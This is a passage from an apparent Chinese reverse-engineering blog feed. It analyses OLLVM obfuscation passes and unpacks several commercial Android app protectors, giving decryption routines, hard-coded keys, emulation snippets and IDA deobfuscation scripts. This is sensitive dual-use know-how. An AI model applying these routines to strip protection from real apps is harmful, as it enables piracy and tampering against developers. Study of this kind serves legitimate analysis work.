op2 = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo);
op = BinaryOperator::Create(Instruction::Add, op, op2, &quot;&quot;, bo);
op = BinaryOperator::CreateNeg(op, &quot;&quot;, bo);
bo-&gt;replaceAllUsesWith(op);

// r = rand (); a = b + r; a = a + c; a = a - r
Type *ty = bo-&gt;getType();
ConstantInt *co = (ConstantInt *)ConstantInt::get(ty, llvm::cryptoutils-&gt;get_uint64_t());
op = BinaryOperator::Create(Instruction::Add, bo-&gt;getOperand(0), co, &quot;&quot;, bo);
op = BinaryOperator::Create(Instruction::Add, op, bo-&gt;getOperand(1), &quot;&quot;, bo);
op = BinaryOperator::Create(Instruction::Sub, op, co, &quot;&quot;, bo);
bo-&gt;replaceAllUsesWith(op);

// r = rand (); a = b - r; a = a + b; a = a + r
Type *ty = bo-&gt;getType();
ConstantInt *co = (ConstantInt *)ConstantInt::get(ty, llvm::cryptoutils-&gt;get_uint64_t());
op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), co, &quot;&quot;, bo);
op = BinaryOperator::Create(Instruction::Add, op, bo-&gt;getOperand(1), &quot;&quot;, bo);
op = BinaryOperator::Create(Instruction::Add, op, co, &quot;&quot;, bo);
bo-&gt;replaceAllUsesWith(op);
</code></pre><p>上面对应着<code>funcAdd</code>数组的四种替换方法。第一种，将第二个操作数取反，然后改写成减法指令。第二种，将两个操作数都取反，结果相加之后再次取反。第三种，取一个随机数，将随机数与操作数1相加，然后将结果与操作数2相加，最后减去随机数。第四种，取一个随机数，将操作数1减去随机数，然后将结果与操作数2相加，最后加上随机数。</p>
<p>指令替换的过程都比较简单，也就不再介绍其他的替换方法了，具体可以参考官网：<a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Instructions-Substitution" target="_blank" rel="noopener">Instructions Substitution</a>。</p>
<h3 id="字符串加密"><a href="#字符串加密" class="headerlink" title="字符串加密"></a>字符串加密</h3><p>“字符串加密”这个功能不是ollvm的，而是”<a href="https://github.com/GoSSIP-SJTU/Armariris" target="_blank" rel="noopener">孤挺花</a>“这个项目的，不过它是基于ollvm的，所以也分析看看。</p>
<p>与上面的pass不同，字符串加密的pass是继承<code>ModulePass</code>的，所以它的入口函数是<code>runOnModule</code>。</p>
<pre><code>virtual bool runOnModule(Module &amp;M) {
    std::vector&lt;GlobalVariable*&gt; toDelConstGlob;
    std::vector&lt;encVar*&gt; encGlob;

    for (Module::global_iterator gi = M.global_begin(), ge = M.global_end(); gi != ge; ++gi) {
        GlobalVariable* gv = &amp;(*gi);

        std::string::size_type str_idx = gv-&gt;getName().str().find(&quot;.str.&quot;);
        std::string section(gv-&gt;getSection());

        if (gv-&gt;isConstant() &amp;&amp; gv-&gt;hasInitializer() &amp;&amp; isa&lt;ConstantDataSequential&gt;(gv-&gt;getInitializer()) &amp;&amp;
                section != &quot;llvm.metadata&quot; &amp;&amp; section.find(&quot;__objc_methname&quot;) == std::string::npos) {
</code></pre><p>首先遍历模块的所有全局变量，只有这个变量为常量，并且已经初始化的，才进行下一步操作。</p>
<pre><code>        GlobalVariable *dynGV = new GlobalVariable(M,
                                      gv-&gt;getType()-&gt;getElementType(),
                                      !(gv-&gt;isConstant()), gv-&gt;getLinkage(),
                                      (Constant*) 0, gv-&gt;getName(),
                                      (GlobalVariable*) 0,
                                      gv-&gt;getThreadLocalMode(),
                                      gv-&gt;getType()-&gt;getAddressSpace());

        dynGV-&gt;setInitializer(gv-&gt;getInitializer());

        Constant *initializer = gv-&gt;getInitializer();
        ConstantDataSequential *cdata = dyn_cast&lt;ConstantDataSequential&gt;(initializer);
        if (cdata) {
            const char *orig = cdata-&gt;getRawDataValues().data();
            unsigned int len = cdata-&gt;getNumElements()*cdata-&gt;getElementByteSize();

            encVar *cur = new encVar();
            cur-&gt;var = dynGV;
            cur-&gt;key = llvm::cryptoutils-&gt;get_uint8_t();

            char *encr = (char*)orig; 

            for (unsigned i = 0; i != len; ++i) {
                    encr[i] = orig[i]^cur-&gt;key;
            }

            dynGV-&gt;setInitializer(initializer);

            encGlob.push_back(cur);
        } else {
            dynGV-&gt;setInitializer(initializer);
        }
        gv-&gt;replaceAllUsesWith(dynGV);
        toDelConstGlob.push_back(gv);

    }
}
</code></pre><p>然后，创建一个全局变量，并且取得一个随机数，将随机数作为key与原先原先全局变量的值进行异或，最后，将结果设为新全局变量的值。</p>
<pre><code>for (unsigned i = 0, e = toDelConstGlob.size(); i != e; ++i)
        toDelConstGlob[i]-&gt;eraseFromParent();

addDecodeFunction(&amp;M, &amp;encGlob);

return true;
</code></pre><p>在这个函数的末尾，删除原先的全局变量，然后调用<code>addDecodeFunction</code>函数，增加一个解密函数。</p>
<pre><code>void addDecodeFunction(Module *mod, std::vector&lt;encVar*&gt; *gvars) {

    std::vector&lt;Type*&gt;FuncTy_args;
    FunctionType* FuncTy = FunctionType::get(
      Type::getVoidTy(mod-&gt;getContext()),  // returning void
      FuncTy_args,  // taking no args
      false);

    uint64_t StringObfDecodeRandomName = cryptoutils-&gt;get_uint64_t();
    std::string  random_str;
    std::strstream random_stream;
    random_stream &lt;&lt; StringObfDecodeRandomName;
    random_stream &gt;&gt; random_str;
    StringObfDecodeRandomName++;
    Constant* c = mod-&gt;getOrInsertFunction(&quot;.datadiv_decode&quot; + random_str, FuncTy);
    Function* fdecode = cast&lt;Function&gt;(c);
    fdecode-&gt;setCallingConv(CallingConv::C);

    ConstantInt* const_0 = ConstantInt::get(mod-&gt;getContext(), APInt(32, 0));
    ConstantInt* const_1 = ConstantInt::get(mod-&gt;getContext(), APInt(32, 1));
    BasicBlock* label_entry = BasicBlock::Create(mod-&gt;getContext(), &quot;entry&quot;, fdecode);
</code></pre><p>开始，创建一个函数声明: <code>void .datadiv_decodexxx()</code>，生成了两个常量和一个基本块，这个基本块作为函数的头</p>
<pre><code>for (unsigned i = 0, e = gvars-&gt;size(); i != e; ++i) {
   GlobalVariable *gvar = (*gvars)[i]-&gt;var;
   char key = (*gvars)[i]-&gt;key;

   Constant *init = gvar-&gt;getInitializer();
   ConstantDataSequential *cdata = dyn_cast&lt;ConstantDataSequential&gt;(init);

   unsigned len = cdata-&gt;getNumElements()*cdata-&gt;getElementByteSize();

   ConstantInt* const_len = ConstantInt::get(mod-&gt;getContext(), APInt(32, len));
   BasicBlock* label_for_body = BasicBlock::Create(mod-&gt;getContext(), &quot;for.body&quot;, fdecode, 0);
     BasicBlock* label_for_end = BasicBlock::Create(mod-&gt;getContext(), &quot;for.end&quot;, fdecode, 0);
</code></pre><p>在循环里面，创建了两个基本块，分别作为解密循环的body和end，并且计算出了当前key的长度</p>
<pre><code>ICmpInst* cmp = new ICmpInst(*label_entry, ICmpInst::ICMP_EQ, const_len, const_0, &quot;cmp&quot;);
BranchInst::Create(label_for_end, label_for_body, cmp, label_entry);
</code></pre><p>在这里，插入了第一条比较指令，条件表达式是：<code>key的长度 == 0</code>，如果为0则跳出循环，否则开始执行循环</p>
<pre><code>Argument* fwdref_18 = new Argument(IntegerType::get(mod-&gt;getContext(), 32));
PHINode* int32_i = PHINode::Create(IntegerType::get(mod-&gt;getContext(), 32), 2, &quot;i.09&quot;, label_for_body);
int32_i-&gt;addIncoming(fwdref_18, label_for_body);
int32_i-&gt;addIncoming(const_0, label_entry);
</code></pre><p>在解密循环的body里面，创建了一个PHI结点，数据源分别是0和解密循环自增变量</p>
<pre><code>std::vector&lt;Value*&gt; ptr_32_indices;
ptr_32_indices.push_back(const_0);
ptr_32_indices.push_back(int64_idxprom);

ArrayRef&lt;Value*&gt; ref_ptr_32_indices = ArrayRef&lt;Value*&gt;(ptr_32_indices);
Instruction* ptr_arrayidx = GetElementPtrInst::Create(NULL, gvar, ref_ptr_32_indices, &quot;arrayidx&quot;, label_for_body);
LoadInst* int8_20 = new LoadInst(ptr_arrayidx, &quot;&quot;, false, label_for_body);
int8_20-&gt;setAlignment(1);
</code></pre><p>这里生成的指令作用是：使用解密循环自增变量作为数组索引，从加密后的字符串里面读取一个字节</p>
<pre><code>ConstantInt* const_key = ConstantInt::get(mod-&gt;getContext(), APInt(8, key));
BinaryOperator* int8_dec = BinaryOperator::Create(Instruction::Xor, int8_20, const_key, &quot;xor&quot;, label_for_body);
StoreInst* void_21 = new StoreInst(int8_dec, ptr_arrayidx, false, label_for_body);
void_21-&gt;setAlignment(1);
</code></pre><p>生成一条异或指令，将key和数据进行异或，得到原数据，最后将它写回。</p>
<pre><code>        BinaryOperator* int32_inc = BinaryOperator::Create(Instruction::Add, int32_i, const_1, &quot;inc&quot;, label_for_body);

        ICmpInst* int1_cmp = new ICmpInst(*label_for_body, ICmpInst::ICMP_EQ, int32_inc, const_len, &quot;cmp&quot;);
        BranchInst::Create(label_for_end, label_for_body, int1_cmp, label_for_body);

        fwdref_18-&gt;replaceAllUsesWith(int32_inc); delete fwdref_18;

        label_entry = label_for_end;
    }
ReturnInst::Create(mod-&gt;getContext(), label_entry);
</code></pre><p>在最后，将解密循环自增变量自增，并且创建比较指令，当解密没完成时回到循环体继续解密。在接下来的代码，主要是获取llvm的全局变量<code>llvm.global_ctors</code>，然后将这个解密函数插入<code>global_ctors</code>，达到在运行时解密的功能。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;分割基本块&quot;&gt;&lt;a href=&quot;#分割基本块&quot; class=&quot;headerlink&quot; title=&quot;分割基本块&quot;&gt;&lt;/a&gt;分割基本块&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;-mllvm -split: activates basic block splitting. Im
    
    </summary>
    
    
      <category term="ollvm" scheme="http://www.ench4nt3r.com/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>数字加固分析</title>
    <link href="http://www.ench4nt3r.com/2018/02/10/post/"/>
    <id>http://www.ench4nt3r.com/2018/02/10/post/</id>
    <published>2018-02-10T03:37:05.000Z</published>
    <updated>2018-02-13T10:35:28.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Dex解密"><a href="#Dex解密" class="headerlink" title="Dex解密"></a>Dex解密</h3><p>加密后的Dex数据被放在壳<code>classes.dex</code>的末尾。格式如下：</p>
<pre><code>struct info {
    byte unknow[4];
    int  file_len; // 不包含头8个字节
    int  unknow_data_len;
    byte *unknow_data;
    int  dex_number; // 下面数组的数量

    struct {
        int full_size; // data_size + 4
        int data_size;
        byte *data;
    } dex[1];    
};
</code></pre><p>解密dex需要两步，第一步是将数据解密，得到一个用lzma压缩的数据，解压后，得到一个加密后的dex数据。第二步就是将加密的dex数据解密。两步解密都各需要一个key。key的计算跟<code>info.unknow_data</code>有关，模拟函数<code>sub_E153C828（该函数在libjiagu.so释放的另外一个so内，下面的函数凡是以sub_E15开头的，都是在释放的so内）</code>执行得到两个key。</p>
<pre><code>sub_E153C828(info.unknow_data, info.unknow_data_len, &amp;key1, &amp;key2);
</code></pre><h5 id="第一步解密："><a href="#第一步解密：" class="headerlink" title="第一步解密："></a>第一步解密：</h5><p>key1需要再次计算：</p>
<pre><code>// sub_E159CE08(&amp;key3, &amp;key1, 16)
  int sub_E159CE08(_BYTE *a1, int a2, int a3)
{
  _BYTE *v3; // r4
  signed int v4; // r5
  int v5; // r6
  unsigned int v6; // r7
  int v7; // r0
  char **v8; // r1
  _BYTE *v9; // r0
  int v10; // r2
  int result; // r0
  int v12; // [sp+8h] [bp-124h]
  int a2a; // [sp+Ch] [bp-120h]
  int v14; // [sp+10h] [bp-11Ch]
  int *v15; // [sp+14h] [bp-118h]

  a2a = a3;
  v12 = a2;
  v3 = a1;
  v4 = 256;
  v5 = 0;
  memset_0();
  v6 = 0;
  do
  {
    v3[v6] = v6;
    v7 = mod(v6, a2a);
    v8 = (char **)&amp;v15;
    *((_BYTE *)&amp;v15 + v6++) = *(_BYTE *)(v12 + v7);
  }
  while ( v6 != 256 );
  v9 = v3;
  do
  {
    v10 = (unsigned __int8)*v9;
    v5 = (v10 + v5 + *(unsigned __int8 *)v8) % 256;
    *v9 = v3[v5];
    v3[v5] = v10;
    --v4;
    v8 = (char **)((char *)v8 + 1);
    ++v9;
  }
  while ( v4 );
  result = _stack_chk_guard - v14;
  if ( _stack_chk_guard != v14 )
  {
    ((void (*)(void))unk_E15BF3EC)();
    JUMPOUT(&amp;unk_E15D7BA4);
  }
  return result;
}
</code></pre><p>key1计算得出key3，用key3进行解密</p>
<pre><code>// sub_E159CEB4(&amp;key3, info.dex[x].data, info.dex[x].data_size);
int __fastcall sub_E159CEB4(int result, _BYTE *a2, int a3)
{
  int v3; // r3
  int v4; // r4
  int v5; // r3
  int v6; // ST08_4
  _BYTE *v7; // r6
  int v8; // r3
  int v9; // r5
  _BYTE *v10; // r0

  v3 = 0;
  if ( a3 )
  {
    v4 = 0;
    do
    {
      v5 = (v3 + 1) % 256;
      v6 = v5;
      v7 = (_BYTE *)(result + v5);
      v8 = *(unsigned __int8 *)(result + v5);
      v9 = result;
      v4 = (v8 + v4) % 256;
      v10 = (_BYTE *)(result + v4);
      *v7 = *v10;
      *v10 = v8;
      result = v9;
      *a2 ^= *(_BYTE *)(v9 + (((unsigned __int8)*v7 + v8) &amp; 0xFF));
      v3 = v6;
      --a3;
      ++a2;
    }
    while ( a3 );
  }
  return result;
}
</code></pre><h5 id="第二步解密"><a href="#第二步解密" class="headerlink" title="第二步解密"></a>第二步解密</h5><p>上一步得到的结果用lzma解压后，将每个字节与key2进行异或就可以了。</p>
<h3 id="指令还原"><a href="#指令还原" class="headerlink" title="指令还原"></a>指令还原</h3><p>原指令被加密并且<code>opcode</code>被改为私有的指令，将加密的指令使用<code>0x65</code>异或得到除<code>opcode</code>的原指令。比如：</p>
<pre><code>// 原指令
6E 20 E7 2B 32 00
// 加密后的指令
A9 45 82 4E 57 65
// xor 0x65
CC 20 E7 2B 32 00
</code></pre><p>壳通过<code>table[私有指令(上例的0xCC) + 0x5C]</code>得到一个操作数，用这个操作数跳转到对应的 switch case 执行相应的dalvik指令。</p>
<p>然后使用参考2的方法还原所有指令：</p>
<blockquote>
<p>有一个好点的办法就是：自己在onCreate方法中将所有的dalvik指令，一共200多条全部写出来。然后用360加固，动态调试，总结出每条dalvik指令对应的360解释器的case处理指令的偏移，最后得到一张指令映射表。这样，后续在脱壳的时候，就可以根据解释执行代码的偏移，还原出原来的指令。当然，360解释器也是在不断变化的，所以，这个表也是要跟着变化的。</p>
</blockquote>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://bbs.pediy.com/thread-223699.htm" target="_blank" rel="noopener">[1] 某VMP加固onCreate方法分析 </a></p>
<p><a href="https://bbs.pediy.com/thread-223528.htm" target="_blank" rel="noopener">[2] 某数字公司VMP脱壳简记 </a> </p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Dex解密&quot;&gt;&lt;a href=&quot;#Dex解密&quot; class=&quot;headerlink&quot; title=&quot;Dex解密&quot;&gt;&lt;/a&gt;Dex解密&lt;/h3&gt;&lt;p&gt;加密后的Dex数据被放在壳&lt;code&gt;classes.dex&lt;/code&gt;的末尾。格式如下：&lt;/p&gt;
&lt;pre&gt;&lt;c
    
    </summary>
    
    
      <category term="Android加固" scheme="http://www.ench4nt3r.com/tags/Android%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>某加密加固分析</title>
    <link href="http://www.ench4nt3r.com/2018/01/31/post/"/>
    <id>http://www.ench4nt3r.com/2018/01/31/post/</id>
    <published>2018-01-31T08:09:18.000Z</published>
    <updated>2018-01-31T09:59:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Apk解密"><a href="#Apk解密" class="headerlink" title="Apk解密"></a>Apk解密</h3><p>加密后的apk文件是<code>assetsi/jiami.dat</code><br>解密代码如下：</p>
<pre><code>void decrypt(char *data, long size) {
    const char *k1 = &quot;Auto-generated destructor stub&quot;;

    for (int i = 0; i &lt; size; i++) {
        int t1 = k1[i % 0x1e];

        int t2 = t1 &amp; (~data[i]);
        int t3 = data[i] &amp; (~t1);

        data[i] = t2 | t3;
    }
}
</code></pre><h3 id="指令还原"><a href="#指令还原" class="headerlink" title="指令还原"></a>指令还原</h3><p>某加密通过hook<code>art::ClassLinker::LoadMethod</code>函数，在该函数被调用时还原相应的函数指令。相关的指令信息存在<code>assets/ijiami.ajm</code>文件中。</p>
<p><code>ijiami.ajm</code>解密代码：</p>
<pre><code>void decrypt(char* data, long size) {
    static unsigned char k1[] = { 0x89, 0xF1, 0xBE, 0x10, 0x80, 0x95, 0x22, 0xA3, 0x99, 0x12, 0x98, 0xDD, 0xF2, 0x9, 0x44, 0x53, 0x2, 0xB3, 0x9F, 0x16, 0x45 };
    static char* k2 = &quot;bb2ec1256fd29305005eb6f5ecb2036c&quot;;

    for (int i = 0; i &lt; size; i++) {
        int t1 = k1[(i % 0x12) + 1];
        int t2 = i - (((i &gt;&gt; 0x1f &lt;&lt; 0x1b) + i) &amp; 0xFFFFFFE0);
        unsigned char t3 = k2[t2];

        int t4 = t3 &amp; (~t1);
        int t5 = t1 &amp; (~t3);
        int t6 = t5 | t4;
        int t7 = t6 &amp; (~data[i]);
        int t8 = data[i] &amp; (~t6);

        data[i] = t7 | t8;
    }
}
</code></pre><p>解密后是一个zip文件，里面有一个<code>classes.dex.ajm</code>文件。</p>
<p><code>classes.dex.ajm</code>文件格式：</p>
<pre><code>struct ajm {
    byte type;
    byte data[1];
};
</code></pre><p>其中type为0x12的是存储的类信息的数据:</p>
<pre><code>struct class_info {
    byte type; // 0x12
    uleb len;    // 整个数据的长度

    struct {
        byte type; // 0x08
        byte key[4];
    } debug_info;

    struct {
        byte type; // 0x10
        byte data[2];
    } unknow;

    // 函数签名
    struct {
        byte type; // 0x1a
        uleb len;
        char data[1]; 
    } method_sig;

    // 函数指令
    struct {
        byte type; // 0x22
        uleb len;
        byte data[1];
    } method_inst;

    // 可能是结束符
    struct {
        byte type; // 0x28
        byte data; // 0x0
    } end;
};
</code></pre><p>type为8的，格式如下:</p>
<pre><code>struct unknow {
    byte type; // 0x8
    uled data[1];
};
</code></pre><p>将<code>class_info.debug_info.key</code>经过计算得到与Java类函数<code>debugInfo</code>字段的值：</p>
<pre><code>class_info.debug_info.key + 0x71AFC1F4 - 0x36c + 0x8E503E0C
</code></pre><p>然后通过该key来查找对应的函数指令。函数指令解密方法：</p>
<pre><code>data = class_info.method_inst.data
for i in xrange(len(data)):
    data[i] = data[i] and ~data[i] &amp; 0xff
</code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/2014asm/p/6534189.html" target="_blank" rel="noopener">[1] 爱加密企业版静态脱壳机编写 </a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Apk解密&quot;&gt;&lt;a href=&quot;#Apk解密&quot; class=&quot;headerlink&quot; title=&quot;Apk解密&quot;&gt;&lt;/a&gt;Apk解密&lt;/h3&gt;&lt;p&gt;加密后的apk文件是&lt;code&gt;assetsi/jiami.dat&lt;/code&gt;&lt;br&gt;解密代码如下：&lt;/p&gt;
&lt;p
    
    </summary>
    
    
      <category term="Android加固" scheme="http://www.ench4nt3r.com/tags/Android%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>某梆加固分析</title>
    <link href="http://www.ench4nt3r.com/2018/01/11/2018-01-11/"/>
    <id>http://www.ench4nt3r.com/2018/01/11/2018-01-11/</id>
    <published>2018-01-11T07:15:22.000Z</published>
    <updated>2018-01-15T08:27:52.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="文件验证"><a href="#文件验证" class="headerlink" title="文件验证"></a>文件验证</h3><p>assets/meta-data/manifest.mf 文件结构</p>
<pre><code>struct __attribute__ ((packed)) manifest {
    byte unknow;
    char base64_1_len[2];
    char *base64_1;
    char base64_2[28];
    char base64_3[28];
    char base64_4[28];
    char base64_5[28];
    char base64_6[28];

    struct {
        char sha1_base64[4];
        char sha256_base64[4];
        char sha384_base64[4];
        char sha512_base64[4];
        char crc[4];
    } files_sig[1];
};
</code></pre><p>然后读取apk每个文件的CRC，将最后四个字节与<code>manifest.file_sig[x].crc</code>对比，并且将所有CRC最后四个字节拼接起来，做一次sha再做base64，与<code>manifest.base64_6</code>对比。</p>
<h3 id="Dex文件解密"><a href="#Dex文件解密" class="headerlink" title="Dex文件解密"></a>Dex文件解密</h3><p>加密的Dex文件：<code>assets/secDataX.jar</code></p>
<p>解密函数如下：</p>
<pre><code>    unsigned int __fastcall sub_EF4F6838(unsigned int result, unsigned __int8 *a2, int a3)
{
  int v3; // r6
  int v4; // r4
  int v5; // r8
  signed int v6; // r4
  int v7; // lr
  int v8; // r5
  int v9; // r9
  int v10; // r12
  int v11; // lr
  int v12; // r5
  int v13; // r4
  char v14; // r12
  unsigned __int8 *v15; // lr
  char v16; // r0
  int v17; // r8
  int v18; // t1
  unsigned __int8 *v19; // r1
  char v20[256]; // [sp+4h] [bp-124h]

  if ( result &gt;= 0x20000 )
  {
    v3 = 0;
  }
  else
  {
    v3 = 0x20000 - result;
    if ( (signed int)(0x20000 - result) &gt;= a3 )
      v3 = a3;
    a3 -= v3;
    if ( v3 &gt; 0 )
    {
      v4 = 0;
      v5 = dword_EF522C70;
      do
      {
        v20[v4] = v4;
        ++v4;
      }
      while ( v4 != 256 );
      v6 = 0;
      v7 = 0;
      v8 = 0;
      do
      {
        v9 = (unsigned __int8)v20[v8];
        v10 = *(unsigned __int8 *)(v5 + v6++);
        v7 += v10 + v9;
        if ( v6 &gt; 15 )
          v6 = 0;
        v7 = (unsigned __int8)v7;
        v20[v8++] = v20[(unsigned __int8)v7];
        v20[v7] = v9;
      }
      while ( v8 != 256 );
      v11 = 0;
      LOBYTE(v12) = 0;
      LOBYTE(v13) = 0;
      while ( v11 != result )
      {
        ++v11;
        v13 = (unsigned __int8)(v13 + 1);
        v14 = v20[(unsigned __int8)v13];
        v12 = (unsigned __int8)(v12 + v14);
        v20[v13] = v20[v12];
        v20[v12] = v14;
      }
      v15 = a2;
      do
      {
        v13 = (unsigned __int8)(v13 + 1);
        v16 = v20[v13];
        v12 = (unsigned __int8)(v12 + v16);
        v20[v13] = v20[v12];
        v20[v12] = v16;
        v17 = (unsigned __int8)v20[(unsigned __int8)(v16 + v20[v13])];
        v18 = *v15++;
        result = v17 ^ v18;
        *(v15 - 1) = v17 ^ v18;
      }
      while ( v15 != &amp;a2[v3] );
    }
  }
  if ( a3 &gt; 0 )
  {
    v19 = &amp;a2[v3];
    result = (unsigned int)v19;
    do
      *v19++ ^= 0xACu;
    while ( (signed int)&amp;v19[-result] &lt; a3 );
  }
  return result;
}
</code></pre><p><code>dword_EF522C70</code>是定值，在运行时赋值。可以通过idaemu模拟这个函数解密。</p>
<pre><code>mu = idaemu.Emu(idaemu.UC_ARCH_ARM, idaemu.UC_MODE_THUMB)

mu.setData(key_addr, xxx)
mu.setData(0xEF0EBC70, key_addr)

data = # 被加密的Dex的数据
size = len(data)
mu.setData(0x7000000, data)

mu.eFunc(0xEF0BF838, None, [0, 0x7000000, size])
</code></pre><p>通过反射调用<code>makeDexElements</code>加载Dex。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;文件验证&quot;&gt;&lt;a href=&quot;#文件验证&quot; class=&quot;headerlink&quot; title=&quot;文件验证&quot;&gt;&lt;/a&gt;文件验证&lt;/h3&gt;&lt;p&gt;assets/meta-data/manifest.mf 文件结构&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;struct __attr
    
    </summary>
    
    
      <category term="Android加固" scheme="http://www.ench4nt3r.com/tags/Android%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>某度加固分析</title>
    <link href="http://www.ench4nt3r.com/2017/12/11/2017-12-11/"/>
    <id>http://www.ench4nt3r.com/2017/12/11/2017-12-11/</id>
    <published>2017-12-10T16:00:00.000Z</published>
    <updated>2018-01-04T11:12:10.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="被加密的JNI-OnLoad"><a href="#被加密的JNI-OnLoad" class="headerlink" title="被加密的JNI_OnLoad"></a>被加密的JNI_OnLoad</h3><p>在IDA中查看JNI_OnLoad函数，可以看见是被加密的。通过IDA调试，在init array中的第一个函数（sub_41764）执行完成后，JNI_OnLoad也被解密了，这样看来sub_41764函数是用来解密JNI_Onload函数咯。</p>
<p>用IDA反编译sub_41764函数，反编译出来的结果根本就不是人能看的，伪代码有大量的花指令，很明显是ollvm中的bcf混淆。</p>
<h3 id="去除BCF"><a href="#去除BCF" class="headerlink" title="去除BCF"></a>去除BCF</h3><p>在ollvm的wiki里面有说bcf的原理，在一些基本块前面加入一个新的基本块，并且这个基本块包含了一个表达式，这个表达式用来控制程序的执行。</p>
<p>这个表达式是长这样：<code>(y &lt; 10 || x * (x - 1) % 2 == 0)</code>，当表达式结果为True时执行真实的基本块，为False时，不可能的，<code>x * (x - 1)</code>的结果永远是奇数，所以不可能满足条件执行False的执行块。</p>
<p>由于<code>x</code>和<code>y</code>都是全局变量，使用IDA的xref很容易就找到bcf基本块的位置。可是，找到bcf基本块之后不能直接将这个块给删除掉，因为它很有可能跟一些真实的指令混在一起。</p>
<p>因此，我们需要将属于bcf的指令和真实的指令分开。做这件事也并不难，通过观察汇编(Thumb)代码，提取到一些BCF使用的指令，构造一个DFA处理他们。状态图如下：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/img/B39D759D1CA4E86C.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>
<p>其中状态8，期待下一条指令是<code>SUBS</code>，但是在我的样本中，有可能是真实的指令(<code>MOV</code>)，所以仍然将状态转移到8。如果到达完成状态，那么可以将所有bcf指令删除掉。需要注意的是，这里有两个完成状态，分别是14和16，状态14的意思是，后面跟随着真实的基本块（bcf表达式为True的后继），所以可以直接将分支指令删除，但是如果是状态16，那么需要插入一个跳转，跳转到<code>BLE</code>指令后面的地址。</p>
<pre><code>class BCFProcessor:
    ...

    def check(self, ea):
        self.state = -1
        self.patch_ea = []

        while True:
            ori_state = state
            mnem = idc.GetMnem(ea)
            state = self.func_maps[state](mnem) # 对应的状态处理函数
            if state == -1:
                return False, ea
            elif state in (14, 16):
                break

            if ori_state != state:
                self.patch_ea.append(ea) # bcf指令，需要删除

            ea += ItemSize(ea)

        self.state = state
        self.end_ea = ea
        return True, ea

    ...


xrefs = XrefsTo(x)

for xref in xrefs:
    if xref.frm &lt; cur_func.start_ea or \
        xref.frm &gt; cur_func.end_ea:
        continue

    if not is_code(xref.frm):
        print(&apos;{}: expecting code reference, skip.&apos;.format(hex(xref.frm)))
        continue

    ret, ea = processor.check(xref.frm)
    if not ret:
        print(&apos;{}: unexpected instruction, skip.&apos;.format(hex(ea)))
        continue

    processor.patch()  # 指令删除（修改为nop指令)

idc.plan_and_wait(cur_func.start_ea, cur_func.end_ea) # 让IDA重新分析该函数

clean_node(cur_func)
</code></pre><p>上面的清理将很多分支指令给删了，所以出现了很多没有前驱的基本块（bcf表达式为False的后继）。通过遍历图，很容易就能将这些没有前驱的基本块删了。代码如下：</p>
<pre><code>def clean_node(func):
    done = False
    while not done:
        done = True

        q = idaapi.qflow_chart_t(&quot;The title&quot;, func, 0, 0, idaapi.FC_PREDS)
        assert(q[0].start_ea == func.start_ea)
        for n in xrange(1, q.size()):
            b = q[n]
            if q.npred(n) != 0: # 判断前驱结点数
                continue

            done = False
            size = b.end_ea - b.start_ea
            MakeUnknown(b.start_ea, size, idaapi.DOUNK_SIMPLE)
            MakeData(b.start_ea, idaapi.FF_BYTE, size, 0)
</code></pre><p>代码中有两个<code>Make*</code>指令，我不知道怎么将一个基本块从图中删除，所以将它们标为数据，视为删除。每当删除一个基本块时，又有可能增加了一个基本块（该基本块只有一个前驱，前驱结点是刚删除的块），所以只有当到达一个不动点时，才结束运行。</p>
<p><strong>IDA并不保证对所有的x和y都能生成xref，我的解决办法是将数据写回文件，并用IDA重新打开被修改后的文件。</strong></p>
<h3 id="去除FLA"><a href="#去除FLA" class="headerlink" title="去除FLA"></a>去除FLA</h3><p>去除了bcf后又能看见一个惊喜，反编译出来的代码明显是用FLA混淆的，好了，继续吧。</p>
<p>去除fla用符号执行是一个很好的选择，可以参考<a href="https://security.tencent.com/index.php/blog/msg/112" target="_blank" rel="noopener">[1]</a>。</p>
<p>在参考1的文章提到，将基本块分为主分发器、子分发器、retn块、真实块、预处理器这几个部分，并且只需要将真实块和retn块连接起来就可以了。在我的样本中，只有一个子分发器，并且同一个真实块有可能跳到的不同分支。</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/img/W3JiE8DmHcOrfZ9r.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>
<p>将子分发器的每个后继结点，从左到右命名，为case1、case2、 case 3、…。其中case6里面有一个if，会导致分支走向改变，分别走向case17和case29。case12和case20共同一个尾部块（预处理器块的前驱）。对于这几个块需要手工处理，其他的可以跟参考[1]那样做。</p>
<h3 id="sub-41764函数"><a href="#sub-41764函数" class="headerlink" title="sub_41764函数"></a>sub_41764函数</h3><p>首先修改so前0x1000字节的内存属性</p>
<pre><code>v36 = syscall(125, v35, 4096, 3);// mprotect(v37, 0x1000, PROT_READ | PROT_WRITE)
</code></pre><p>并且将program header和section header的内容清零</p>
<pre><code>v45 = *v149;                              // base addr
*v42 = (int)&amp;(*v44)-&gt;e_ident[v45-&gt;e_phoff];// program header
*v43 = (*v41)-&gt;e_phentsize * (*v41)-&gt;e_phnum;// program header size
*v152 = 0;
while ( 1 )                               // memset(program header, 0, program header size)
{
  v47 = 0;
  if ( *v152 &lt;= (unsigned int)*v43 )
    v47 = 1;
  if ( !(v47 &amp; 1) )
